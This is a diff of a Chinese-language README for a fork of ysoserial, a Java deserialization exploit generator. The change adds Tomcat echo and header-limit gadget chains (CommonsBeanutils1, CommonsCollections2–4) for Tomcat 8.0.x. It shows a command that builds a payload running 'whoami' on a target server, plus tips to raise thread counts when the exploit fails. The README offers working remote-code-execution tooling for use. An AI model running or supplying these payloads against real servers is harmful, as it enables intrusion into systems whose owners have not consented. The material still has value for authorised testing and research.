@@ -1,16 +1,16 @@
 ## 新改动
 
-> Tomcat 7.x 目前不行
+> Tomcat 7.x 目前不行，新增对于Tomcat8.0.x低版本的适配（未测试所有版本，有版本测试未成功可以提issue）
 
 添加了Tomcat回显的方式
 新添的链
 
 -  CommonsBeanutils1TomcatHeader（用于解除tomcat对于request header的大小限制）
-- CommonsBeanutils1TomcatEcho2
-
-- CommonsCollections2TomcatEcho2
-- CommonsCollections3TomcatEcho2
-- CommonsCollections4TomcatEcho2
+-  CommonsBeanutils1TomcatEcho2
+-  CommonsCollections2TomcatEcho2
+-  CommonsCollections2TomcatHeader（用于解除tomcat对于request header的大小限制）
+-  CommonsCollections3TomcatEcho2
+-  CommonsCollections4TomcatEcho2
 
 编译时直接跳过tests
 ```
@@ -23,7 +23,7 @@ mvn package -DskipTests
 java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections2TomcatEcho2 "whoami"
 ```
 
-改变tomcat header限制
+改变tomcat header限制，注意使用对应gadget对应的payload，注意线程数控制，发现不成功可以调大线程数试一试
 
 ```
 java -jar ysoserial-0.0.6-SNAPSHOT-all.jar  CommonsBeanutils1TomcatHeader 16000
